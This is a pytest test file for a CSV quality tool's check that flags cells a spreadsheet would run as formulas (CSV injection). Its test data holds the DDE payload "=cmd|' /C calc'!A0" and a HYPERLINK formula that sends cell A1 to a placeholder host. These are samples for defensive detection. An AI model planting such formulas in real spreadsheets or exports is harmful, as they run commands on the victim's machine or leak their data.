"""Tests for ``--forbid-formula NAME`` (issue #310)."""

from __future__ import annotations

import itertools
import json
from collections.abc import Callable
from pathlib import Path

import pytest

from csv_quality_report import build_report, evaluate, read_table
from csv_quality_report.checks import CHECK_FORMULA, CHECK_REQUIRED_COLUMN
from csv_quality_report.cli import main
from csv_quality_report.profile import FormulaProfile, is_formula, profile_file

WriteCsv = Callable[..., Path]
# Orders of an online store: customer-typed notes and contacts. Two notes and
# two contacts would run as formulas (one padded, which counts as its
# stripped value); "-" is a placeholder, "s/d" and an empty cell are missing,
# and the amounts are negative numbers, never formulas.
DATA = (
    "Pedido;Nota;Contacto;Monto\n"
    'P1;"=HYPERLINK(""http://x.example/?d=""&A1;""Ver"")";+54 9 11 5555-1234;-1250\n'
    "P2;Dejar en porteria;@tienda.sur;+300\n"
    "P3;-;  @tienda.sur  ;-12.5\n"
    "P4;=1+1;ana@example.com;-0.5\n"
    "P5;s/d;;-1e3\n"
    "P6;=1+1;5555-1234;-\n"
)


def formulas(path: Path, name: str = "Nota", **options: object) -> FormulaProfile:
    report = profile_file(
        path,
        delimiter=";",
        na_tokens=("s/d",),
        forbid_formula=(name,),
        **options,  # type: ignore[arg-type]
    )
    (found,) = report.formulas
    return found


# --- what counts as a formula --------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "=1+1",
        "=",  # an equals sign alone is a formula with an error
        '=HYPERLINK("http://x.example";"Ver")',
        "=cmd|' /C calc'!A0",  # the classic DDE payload
        "@SUM(1+1)",
        "@tienda.sur",
        "@",
        "+54 9 11 5555-1234",  # a phone in international format
        "-2+3",
        "+1-1",
        "-Sin observaciones-",
        "--",  # only a single sign alone is a placeholder
        "-12,5",  # with a point as the decimal mark, not a number
        "-1.234,5",  # thousands separators need the reading options
        "-12 %",
        "-$5",
        "-inf",
        "-nan",
    ],
)
def test_formula_values(value: str) -> None:
    assert is_formula(value)


@pytest.mark.parametrize(
    "value",
    [
        "-12",
        "+12",
        "-12.5",
        "+.5",
        "-1e3",
        "-1.5E-05",
        "-",  # a placeholder
        "+",
        "",
        "Ana",
        "ana@example.com",  # @ inside, not first
        "5555-1234",
        "1+1",
        " =1+1",  # surrounding whitespace is stripped before the test
        "＝1+1",  # a full-width equals sign
        "'=1+1",  # already escaped with an apostrophe
    ],
)
def test_other_values(value: str) -> None:
    assert not is_formula(value)


def test_decimal_comma_changes_which_signed_values_are_numbers() -> None:
    assert not is_formula("-12,5", decimal_comma=True)
    assert is_formula("-12.5", decimal_comma=True)
    assert is_formula("=12,5", decimal_comma=True)


@pytest.mark.parametrize("value", [None, -12, b"=1+1", ["=1"]])
def test_values_that_are_not_text(value: object) -> None:
    assert not is_formula(value)  # type: ignore[arg-type]


# --- measuring in the profile ------------------------------------------------


def test_cells_and_examples(write_csv: WriteCsv) -> None:
    found = formulas(write_csv(DATA))
    assert found == FormulaProfile(
        column="Nota",
        cells=3,
        examples=(("=1+1", 2), ('=HYPERLINK("http://x.example/?d="&A1;"Ver")', 1)),
    )


def test_stripped_values_are_counted_together(write_csv: WriteCsv) -> None:
    found = formulas(write_csv(DATA), "Contacto")
    assert found == FormulaProfile(
        column="Contacto",
        cells=3,
        examples=(("@tienda.sur", 2), ("+54 9 11 5555-1234", 1)),
    )


def test_numbers_and_lone_signs_are_not_formulas(write_csv: WriteCsv) -> None:
    assert formulas(write_csv(DATA), "Monto") == FormulaProfile(column="Monto", cells=0)


def test_top_limits_the_examples_not_the_count(write_csv: WriteCsv) -> None:
    path = write_csv(DATA)
    one = formulas(path, top_n=1)
    assert (one.cells, one.examples) == (3, (("=1+1", 2),))
    none = formulas(path, top_n=0)
    assert (none.cells, none.examples) == (3, ())


def test_ties_keep_the_first_seen_value(write_csv: WriteCsv) -> None:
    path = write_csv("x;y\n@b;1\n=a;1\n-c;1\n")
    assert formulas(path, "x").examples == (("@b", 1), ("=a", 1), ("-c", 1))


def test_a_clean_column(write_csv: WriteCsv) -> None:
    assert formulas(write_csv(DATA), "Pedido") == FormulaProfile(column="Pedido", cells=0)


def test_missing_cells_are_not_checked(write_csv: WriteCsv) -> None:
    # "=NA()" is listed as a missing-value text, so it is not checked.
    path = write_csv("x;y\n=NA();1\n=A1;1\n;1\n")
    report = profile_file(path, delimiter=";", na_tokens=("=NA()",), forbid_formula=("x",))
    assert report.formulas == (FormulaProfile(column="x", cells=1, examples=(("=A1", 1),)),)


# A column of signed amounts as a spreadsheet in Spanish exports them.
AMOUNTS = "Monto;x\n-1.234,50;1\n+3,5;1\n-$ 120;1\n(45,00);1\n-12,5 kg;1\n-Gs. 5.000;1\n"


def test_reading_options_decide_which_signed_values_are_numbers(write_csv: WriteCsv) -> None:
    path = write_csv(AMOUNTS)
    plain = formulas(path, "Monto", top_n=10)
    assert plain.cells == 5  # "(45,00)" does not start with a sign
    comma = formulas(path, "Monto", decimal_comma=True, top_n=10)
    assert comma.examples == (("-1.234,50", 1), ("-$ 120", 1), ("-12,5 kg", 1), ("-Gs. 5.000", 1))
    grouped = formulas(path, "Monto", decimal_comma=True, thousands=".", top_n=10)
    assert grouped.examples == (("-$ 120", 1), ("-12,5 kg", 1), ("-Gs. 5.000", 1))
    affixed = formulas(
        path,
        "Monto",
        decimal_comma=True,
        thousands=".",
        number_affixes=("$", "kg", "Gs."),
        top_n=10,
    )
    assert affixed == FormulaProfile(column="Monto", cells=0)


def test_accounting_negatives_do_not_hide_formulas(write_csv: WriteCsv) -> None:
    path = write_csv("x;y\n(5);1\n5-;1\n-5;1\n-(5);1\n=(5);1\n")
    found = formulas(path, "x", accounting_negatives=True, top_n=10)
    assert found.examples == (("-(5)", 1), ("=(5)", 1))


def test_only_numbers_count_as_safe_not_dates_or_booleans(write_csv: WriteCsv) -> None:
    # Reading options that rewrite signed values into a date or a boolean do
    # not make them numbers, so they are still formulas.
    path = write_csv("x;y\n-1;1\n+;1\n-;1\n")
    found = formulas(path, "x", bool_words=(("+", "-"),), top_n=10)
    assert found == FormulaProfile(column="x", cells=0)
    path = write_csv("x;y\n-si;1\n")
    assert formulas(path, "x", bool_words=(("-si", "-no"),)).cells == 1


@pytest.mark.parametrize("decimal_comma", [False, True])
def test_the_profile_agrees_with_is_formula(write_csv: WriteCsv, decimal_comma: bool) -> None:
    # The profile tests only the values that start with = + - or @, in bulk;
    # without other reading options it must count exactly the values
    # ``is_formula`` accepts, in the order first seen.
    parts = ["", "=", "+", "-", "@", "1", ".", ",", "5", "e", "x", " "]
    values = list(dict.fromkeys("".join(p) for p in itertools.product(parts, repeat=4)))
    values = [v for v in values if v.strip() == v and v and v != "s/d"]
    path = write_csv("x;y\n" + "".join(f"{v};1\n" for v in values))
    found = formulas(path, "x", top_n=len(values), decimal_comma=decimal_comma)
    expected = tuple((v, 1) for v in values if is_formula(v, decimal_comma))
    assert len(expected) >= 500
    assert len(values) - len(expected) >= 500
    assert (found.cells, found.examples) == (len(expected), expected)


def test_a_value_seen_only_in_a_later_batch_is_found(write_csv: WriteCsv) -> None:
    rows = "".join(f"Cliente {i};1\n" for i in range(25_000))
    path = write_csv("Nota;x\n" + rows + "=1+1;1\n")
    assert formulas(path).examples == (("=1+1", 1),)
    assert formulas(path, max_rows=25_000).cells == 0


def test_unprofiled_and_unknown_columns_are_skipped(write_csv: WriteCsv) -> None:
    report = profile_file(
        write_csv(DATA),
        delimiter=";",
        columns=("Pedido",),
        forbid_formula=("Nota", "Nada"),
    )
    assert report.formulas == ()


def test_build_report_measures_the_same(write_csv: WriteCsv) -> None:
    path = write_csv(DATA)
    table = read_table(path, delimiter=";")
    built = build_report(table, na_tokens=("s/d",), forbid_formula=["Nota"])
    assert built.formulas == (formulas(path),)


def test_build_report_passes_the_reading_options(write_csv: WriteCsv) -> None:
    path = write_csv(AMOUNTS)
    table = read_table(path, delimiter=";")
    built = build_report(
        table,
        decimal_comma=True,
        thousands=".",
        number_affixes=("$", "kg", "Gs."),
        forbid_formula=["Monto"],
    )
    assert built.formulas == (FormulaProfile(column="Monto", cells=0),)


def test_no_names_no_profiles(write_csv: WriteCsv) -> None:
    assert profile_file(write_csv(DATA), delimiter=";").formulas == ()


# --- evaluate() ----------------------------------------------------------------


def checked(path: Path, **options: object) -> list[tuple[str, str | None, bool, str]]:
    report = profile_file(
        path,
        delimiter=";",
        na_tokens=("s/d",),
        forbid_formula=("Nota", "Pedido"),
        **options,  # type: ignore[arg-type]
    )
    checks = evaluate(report, forbid_formula=["Nota", "Pedido", "Nota"])
    return [(c.check, c.column, c.passed, c.describe()) for c in checks]


def test_evaluate_fails_passes_and_describes(write_csv: WriteCsv) -> None:
    assert checked(write_csv(DATA)) == [
        (
            CHECK_FORMULA,
            "Nota",
            False,
            "column 'Nota' has 3 cells that a spreadsheet would read as formulas (CSV "
            "injection; clean them or prefix them with an apostrophe before opening the file "
            'in a spreadsheet): "=1+1" in 2 cells, '
            '"=HYPERLINK("http://x.example/?d="&A1;"Ver")" in 1 cell',
        ),
        (
            CHECK_FORMULA,
            "Pedido",
            True,
            "column 'Pedido' has no values a spreadsheet would read as formulas",
        ),
    ]


def test_evaluate_singular_and_without_examples(write_csv: WriteCsv) -> None:
    path = write_csv("Pedido;Nota\nA;@x\nB;y\n")
    (nota, _) = checked(path)
    assert nota[3] == (
        "column 'Nota' has 1 cell that a spreadsheet would read as a formula (CSV injection; "
        "clean them or prefix them with an apostrophe before opening the file in a "
        'spreadsheet): "@x" in 1 cell'
    )
    (nota, _) = checked(path, top_n=0)
    assert nota[3] == (
        "column 'Nota' has 1 cell that a spreadsheet would read as a formula (CSV injection; "
        "clean them or prefix them with an apostrophe before opening the file in a "
        "spreadsheet)"
    )


def test_evaluate_shows_invisible_characters(write_csv: WriteCsv) -> None:
    path = write_csv('Pedido;Nota\nA;"=1+1\tx\n=2"\n')
    (nota, _) = checked(path)
    assert nota[3].endswith(': "=1+1\\u0009x\\u000a=2" in 1 cell')


def test_evaluate_needs_the_names_in_the_report(write_csv: WriteCsv) -> None:
    report = profile_file(write_csv(DATA), delimiter=";")
    with pytest.raises(ValueError, match="'Nota' has a formula check but the report"):
        evaluate(report, forbid_formula=["Nota"])


def test_unknown_and_unprofiled_columns(write_csv: WriteCsv) -> None:
    path = write_csv(DATA)
    report = profile_file(path, delimiter=";")
    checks = evaluate(report, forbid_formula=["Nita"])
    assert [(c.check, c.column, c.passed) for c in checks] == [
        (CHECK_REQUIRED_COLUMN, "Nita", False)
    ]
    narrow = profile_file(path, delimiter=";", columns=("Pedido",))
    with pytest.raises(ValueError, match="column 'Nota' has a per-column check"):
        evaluate(narrow, forbid_formula=["Nota"])


# --- command line --------------------------------------------------------------


def run(write_csv: WriteCsv, *args: str, data: str = DATA) -> int:
    return main([str(write_csv(data)), "--delimiter", "auto", "--na", "s/d", *args])


def test_cli_fails(write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]) -> None:
    code = run(write_csv, "--top", "1", "--forbid-formula", "Contacto")
    out, err = capsys.readouterr()
    assert code == 8
    assert err == (
        "check failed: column 'Contacto' has 3 cells that a spreadsheet would read as "
        "formulas (CSV injection; clean them or prefix them with an apostrophe before "
        'opening the file in a spreadsheet): "@tienda.sur" in 2 cells\n'
    )
    assert "- FAIL: column 'Contacto' has 3 cells that a spreadsheet would read as" in out


def test_cli_passes(write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(write_csv, "--forbid-formula", "Monto") == 0
    out = capsys.readouterr().out
    assert "- pass: column 'Monto' has no values a spreadsheet would read as formulas" in out


def test_cli_reading_options_apply(write_csv: WriteCsv) -> None:
    args = ["--forbid-formula", "Monto", "--decimal-comma", "--thousands", "dot"]
    assert run(write_csv, *args, data=AMOUNTS) == 8
    affixes = ["--number-affix", "$", "--number-affix", "kg", "--number-affix", "Gs."]
    assert run(write_csv, *args, *affixes, data=AMOUNTS) == 0


def test_cli_markdown_escapes_the_values(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]
) -> None:
    data = "Pedido;Nota\nA;=cmd|' /C calc'!A0\n"
    assert run(write_csv, "--forbid-formula", "Nota", data=data) == 8
    out = capsys.readouterr().out
    (line,) = [line for line in out.splitlines() if line.startswith("- FAIL")]
    assert "=cmd\\|' /C calc'!A0" in line


def test_cli_json(write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(write_csv, "--format", "json", "--forbid-formula", "Nota") == 8
    (check,) = json.loads(capsys.readouterr().out)["checks"]
    assert check == {
        "check": "formula",
        "column": "Nota",
        "limit": 0,
        "value": 3,
        "passed": False,
        "formulas": {"=1+1": 2, '=HYPERLINK("http://x.example/?d="&A1;"Ver")': 1},
    }


def test_cli_json_of_a_passing_check(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]
) -> None:
    assert run(write_csv, "--format", "json", "--forbid-formula", "Pedido") == 0
    (check,) = json.loads(capsys.readouterr().out)["checks"]
    assert check["formulas"] == {}
    assert check["passed"] is True


def test_cli_repeated_name_gives_one_check(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]
) -> None:
    args = ("--format", "json", "--forbid-formula", "Nota", "--forbid-formula", "Nota")
    assert run(write_csv, *args) == 8
    assert len(json.loads(capsys.readouterr().out)["checks"]) == 1


def test_cli_name_with_commas_and_equals_signs(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]
) -> None:
    path = write_csv("a=b,c;d\n=1;1\n")
    assert main([str(path), "--delimiter", ";", "--forbid-formula", "a=b,c"]) == 8
    assert "column 'a=b,c' has 1 cell that" in capsys.readouterr().err


def test_without_the_option_reports_are_unchanged(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]
) -> None:
    assert run(write_csv, "--format", "json") == 0
    assert "formulas" not in capsys.readouterr().out


@pytest.mark.parametrize(
    ("args", "message"),
    [
        (["--forbid-formula", ""], "invalid --forbid-formula value: '' (no name)"),
        (["--forbid-formula", "  "], "invalid --forbid-formula value: '  ' (no name)"),
        (
            ["--columns", "Pedido", "--forbid-formula", "Nota"],
            "--forbid-formula checks column 'Nota', which --columns leaves out",
        ),
    ],
)
def test_cli_usage_errors(
    write_csv: WriteCsv, capsys: pytest.CaptureFixture[str], args: list[str], message: str
) -> None:
    with pytest.raises(SystemExit) as exc:
        run(write_csv, *args)
    assert exc.value.code == 2
    assert message in capsys.readouterr().err


def test_cli_unknown_column(write_csv: WriteCsv, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(write_csv, "--forbid-formula", "Nita") == 8
    assert "required column 'Nita' is missing" in capsys.readouterr().err
